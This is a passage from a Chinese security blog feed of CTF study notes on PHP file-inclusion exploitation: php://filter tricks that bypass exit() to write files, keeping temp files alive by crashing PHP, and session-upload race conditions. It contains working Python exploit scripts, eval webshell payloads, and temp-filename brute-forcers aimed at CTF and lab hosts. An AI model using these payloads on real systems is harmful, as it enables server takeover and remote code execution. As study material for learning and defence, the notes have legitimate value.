</p><p>文件是创建成功了的，但是却无法写入内容</p><p>问题在于resource 后边的<code>=</code>；</p><p><code>=</code>在base64中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，</p><p>所以想办法去掉等号</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags|convert.base64-decode/</span>resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>B.php<br>上面那个是对照看的<br></code></pre></td></tr></table></figure><p>如上所示，我们用<code>string.strip_tags</code>，并且使用?&gt;闭合我们的php语句</p><p><img src="D:/mdimage/1615988348_6052067c39528ab8a8048.jpeg" alt="0KI8vd.png"> </p><p>在服务器上创建是可以看到的</p><p><img src="D:/mdimage/image-20221017190827299.png" alt="image-20221017190827299"> </p><p>但是浏览器访问不到了</p><p>我们发现文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags|convert.base64-decode/</span>resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>B<span class="hljs-regexp">/../</span>shell.php<br></code></pre></td></tr></table></figure><p>这个绕过不同变量好奇怪一直在本机上行不通</p><h4 id="方法一-string-rot13"><a href="#方法一-string-rot13" class="headerlink" title="方法一(string.rot13)"></a>方法一(string.rot13)</h4><p>此时由于<code>//</code>的注释效果，我们需要添加%0a换行从而执行php代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13|%0a&lt;?cuc cucvasb();|/</span>resource=tyskill.php<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221018200641667.png" alt="image-20221018200641667"> </p><p>创建成功，执行成功</p><h4 id="方法二-convert-iconv"><a href="#方法二-convert-iconv" class="headerlink" title="方法二(convert.iconv.*)"></a>方法二(convert.iconv.*)</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># usc-2: 对目标字符串进行2位一反转</span><br>?content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&lt;hp phpipfn(o;)|/</span>resource=tyskill.php<br></code></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a> </p><p><a href="https://tyskill.github.io/posts/php_filter_%E8%BF%87%E6%BB%A4%E5%99%A8/">php:&#x2F;&#x2F;filter过滤器学习记录 | tyskillのBlog</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">(56条消息) php:&#x2F;&#x2F;filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php:&#x2F;&#x2F;filter rot13</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖漏洞</title>
    <link href="/decemberus.com/2022/02/19/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <url>/decemberus.com/2022/02/19/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP临时文件机制与利用的思考"><a href="#PHP临时文件机制与利用的思考" class="headerlink" title="PHP临时文件机制与利用的思考"></a>PHP临时文件机制与利用的思考</h1><h1 id="PHPLFI"><a href="#PHPLFI" class="headerlink" title="PHPLFI"></a>PHPLFI</h1><p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p><p>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。</p><p>目前，常见的两种临时文件包含漏洞利用方法主要是：<code>PHPINFO()</code> and <code>PHP7 Segment Fault</code>，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。</p><h1 id="了解PHP临时文件"><a href="#了解PHP临时文件" class="headerlink" title="了解PHP临时文件"></a>了解PHP临时文件</h1><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。<br>上传后会文件会保存在全局变量$_FILES里，该数组包含了所有上传文件的文件信息。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘name’]</span> 客户端文件的原名称。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘type’]</span> 文件的 MIME 类型，如果浏览器提供该信息的支持，例如”image/gif”。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘size’]</span> 已上传文件的大小，单位为字节。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘tmp_name’]</span> 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘error’]</span> 该文件上传的错误代码，上传成功其值为0，否则为错误信息。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘tmp_name’]</span> 文件被上传后在服务端存储的临时文件名<br></code></pre></td></tr></table></figure><p>这里的重点就是<code>$_FILES[‘userfile’][‘tmp_name’]</code> 这个变量。</p><h2 id="临时文件的存储目录"><a href="#临时文件的存储目录" class="headerlink" title="临时文件的存储目录"></a>临时文件的存储目录</h2><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中，假如开启了open_basedir，要想成功上传，系统默认临时目录需要指定PHP可访问。</p><p>在wamp中，upload_tmp_dir属性默认为wamp安装目录下的tmp文件夹：</p><p><img src="D:\mdimage\t011f9d1089d0559dd4.png" alt="wamp临时目录"> </p><blockquote><p>WAMP是Windows下的Apache+Mysql&#x2F;MariaDB+Perl&#x2F;PHP&#x2F;Python的缩写</p></blockquote><p>在Centos7中，upload_tmp_dir没有指定，所以会使用系统默认临时目录，这里是&#x2F;tmp目录，该属性可以通过sys_get_temp_dir()函数来获得</p><p><img src="D:\mdimage\image-20221011194917889.png" alt="image-20221011194917889"> </p><h2 id="临时文件的命名规则"><a href="#临时文件的命名规则" class="headerlink" title="临时文件的命名规则"></a>临时文件的命名规则</h2><p>在上传存储到临时目录后，临时文件命名的规则如下:</p><p>默认为 php+4或者6位随机数字和大小写字母</p><p>php[0-9A-Za-z]{3,4,5,6}</p><p>比如 ：phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p><p>windows下，在windows环境中，php会调用GetTempFileName方法，具体定义在源码的php_open_temporary_file.c中</p><p><img src="D:\mdimage\t018e8f64ce52f4be7f.png" alt="windows文件命名"> </p><p>在linux下则是适用mkstemp方法，此方法依赖于glibc的编译方式，通常生成6位随机数，范围为62（A-Za-z0-9）</p><p><img src="D:\mdimage\t015a2d67e3293214bc.png" alt="linux下文件名"> </p><p><img src="D:\mdimage\t01faaa80caff6c36c7.png" alt="linux下文件命名"> </p><h2 id="临时文件的正常存活周期"><a href="#临时文件的正常存活周期" class="headerlink" title="临时文件的正常存活周期"></a>临时文件的正常存活周期</h2><p><img src="D:\mdimage\t01f616deba6a4cfb62.png" alt="临时文件正常的存货周期"> </p><p>上面这张图是PHP在通过POST方法上传文件时的运行周期图，可以看到我们临时文件的存活周期就是上图红色框中的时间段。另外，如果在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>既然了解了PHP上传会产生临时文件，并且文件内容可控，那我们就不禁要思考思考，这里有没有存在可以利用的点呢？</p><p>这就有以下几个问题：</p><h2 id="问题一：如何能够访问到该临时文件？"><a href="#问题一：如何能够访问到该临时文件？" class="headerlink" title="问题一：如何能够访问到该临时文件？"></a>问题一：如何能够访问到该临时文件？</h2><p>由于临时文件目录一般不可访问，因此想要利用临时文件一般需要配合文件包含，或者某些ssrf结合包含来进行利用。</p><h2 id="问题二：如何获得临时文件的文件名？"><a href="#问题二：如何获得临时文件的文件名？" class="headerlink" title="问题二：如何获得临时文件的文件名？"></a>问题二：如何获得临时文件的文件名？</h2><p>1.在前面介绍过临时文件的命名规则，因此，当我们获得了一个文件包含点时，可以通过暴力猜解文件名来得到。这时最朴素，最笨拙的方法，但也是最有效的方法。</p><p>2.在windows中，利用了FindFirstFile方法，可以通过通配符来进行文件包含，在linux中也有相应的一些方法。</p><p>3.第三种方法就是通过&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xxx来获得，xxx从10开始，这里获得的时当前运行进程ID的一些符号链接，这个方式的有效性取决于上传文件的大小，大文件可以增加尝试的时间。</p><p>获得文件名的方法应该有很多，这里只列举最笨拙的几种</p><h2 id="如何在php运行时间内包含到该临时文件？"><a href="#如何在php运行时间内包含到该临时文件？" class="headerlink" title="如何在php运行时间内包含到该临时文件？"></a>如何在php运行时间内包含到该临时文件？</h2><p>1.本地文件包含可以让php包含自身从而导致死循环，然后php守护进程产生内存溢出，然后php会崩溃，php自身是不会因为错误直接退出的，它会清空自己的内存堆栈，以便从错误中恢复，这就保证了web服务的正常运转的同时，打断了php对临时文件的处理，在这个时候对任一php文件进行post文件请求，临时文件就会被保留。</p><p>正常的执行流程应该如下图所示：</p><p><img src="D:\mdimage\t01610a5c5cd09be792.png" alt="正常执行流程"> </p><p>而在漏洞利用过程中：</p><p><img src="D:\mdimage\t01aa94dbe78929b207.png" alt="漏洞利用流程"> </p><p>因此临时目录下的临时文件有部分得以保存，再通过包含这部分文件即可getshell。</p><h2 id="php-x2F-x2F-filter-x2F-string-strip-tags"><a href="#php-x2F-x2F-filter-x2F-string-strip-tags" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;string.strip_tags"></a>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</h2><p>php7.0的bug</p><p>payload如下，在有文件包含的文件下用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">include.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure><h2 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h2><p>3.利用wupco师傅发现的filter:<code>convert.quoted-printable-encode</code>导致的segment fault。实际上，这个崩溃并不适用于include，require等函数，经过测试，该方法适用于以下版本（201812月以前的版本，由于师傅提交了因此之后的版本修复了，tql）的以下函数（file函数，file_get_contents函数，readfile函数）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span><br><br>• php<span class="hljs-number">7.0.4-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">12</span><br><br>• php&lt;=<span class="hljs-number">5</span>.<span class="hljs-number">6</span>.<span class="hljs-number">38</span>的版本<br></code></pre></td></tr></table></figure><p>这里要说明下5.6.39-5.6.9以内的版本并不存在这个崩溃</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">php:</span>//<span class="hljs-keyword">filter</span>/convert.quoted-printable-encode/resource<span class="hljs-operator">=</span>data://<span class="hljs-punctuation">,</span><span class="hljs-variable">%bfAAAAAAAAAAAAAAAAAAAAAAA</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></code></pre></td></tr></table></figure><p>例题的话可以去看buu上找npu又个叫ezclude的题</p><p><a href="https://www.anquanke.com/post/id/183046?from=groupmessage">PHP临时文件机制与利用的思考-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1 id="实战攻击"><a href="#实战攻击" class="headerlink" title="实战攻击"></a>实战攻击</h1><h2 id="session对话进行文件包含"><a href="#session对话进行文件包含" class="headerlink" title="session对话进行文件包含"></a>session对话进行文件包含</h2><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><p>大佬的写入shell脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>host = <span class="hljs-string">&#x27;http://de198dd7-5ee5-4fae-a188-83bc584d65a9.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br>sessid = <span class="hljs-string">&#x27;vrh&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            host,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;a.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-comment"># if &#x27;flag&#x27; not in response.text:</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br>    READ(session)<br><br></code></pre></td></tr></table></figure><h2 id="php7-segment-fault"><a href="#php7-segment-fault" class="headerlink" title="php7 segment fault"></a>php7 segment fault</h2><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><span class="hljs-keyword">from</span> io import BytesIO<br>url=<span class="hljs-string">&quot;http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br>payload=<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br>files=&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-title function_ invoke__">BytesIO</span>(payload.<span class="hljs-title function_ invoke__">encode</span>())<br>&#125;<br>r=requests.<span class="hljs-title function_ invoke__">post</span>(url=url,files=files,allow_redirects=False)<br><br><span class="hljs-keyword">print</span>(r.text)<br><br></code></pre></td></tr></table></figure><p>找到文件包含的地方，写文件，爆破临时文件名，写入shell</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，<span class="hljs-keyword">POST</span>的临时文件就会被保留<br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">具体原理在这里</a>    </p><p><a href="https://blog.csdn.net/weixin_46081055/article/details/120204436?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">那两种新方式的例题在这呀</a></p><p>或者也可以用下面这一个组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>charset = string.digits + string.letters<br><br>host = <span class="hljs-string">&quot;192.168.43.155&quot;</span><br>port = <span class="hljs-number">80</span><br>base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file_to_include</span>(<span class="hljs-params">url, file_content</span>):<br>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, files=files)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span> e<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_tmp_files</span>():<br>    webshell_content = <span class="hljs-string">&#x27;&lt;?php eval($_REQUEST[c]);?&gt;&#x27;</span>.encode(<br>        <span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip()<br>    file_content = <span class="hljs-string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&#x27;</span> % (<br>        webshell_content)<br>    phpinfo_url = <span class="hljs-string">&quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (<br>        base_url)<br>    length = <span class="hljs-number">6</span><br>    times = <span class="hljs-built_in">len</span>(charset) ** (length / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(times):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] %d / %d&quot;</span> % (i, times)<br>        upload_file_to_include(phpinfo_url, file_content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    generate_tmp_files()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>charset = string.digits + string.letters<br><br>host = <span class="hljs-string">&quot;192.168.43.155&quot;</span><br>port = <span class="hljs-number">80</span><br>base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_tmp_files</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> charset:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> charset:<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> charset:<br>                    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> charset:<br>                        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> charset:<br>                            filename = i + j + k + l + m + n<br>                            url = <span class="hljs-string">&quot;%s/include.php?f=/tmp/php%s&quot;</span> % (<br>                                base_url, filename)<br>                            <span class="hljs-built_in">print</span> url<br>                            <span class="hljs-keyword">try</span>:<br>                                response = requests.get(url)<br>                                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.content:<br>                                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Include success!&quot;</span><br>                                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                                <span class="hljs-built_in">print</span> e<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    brute_force_tmp_files()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>第一个脚本是写临时文件令其崩溃的，第二个是爆破临时文件的</p><p><a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault - 简书 (jianshu.com)</a></p><p><a href="https://www.anquanke.com/post/id/201136#h3-8">PHP LFI 利用临时文件 Getshell 姿势-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP字符串解析</title>
    <link href="/decemberus.com/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/"/>
    <url>/decemberus.com/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/</url>
    
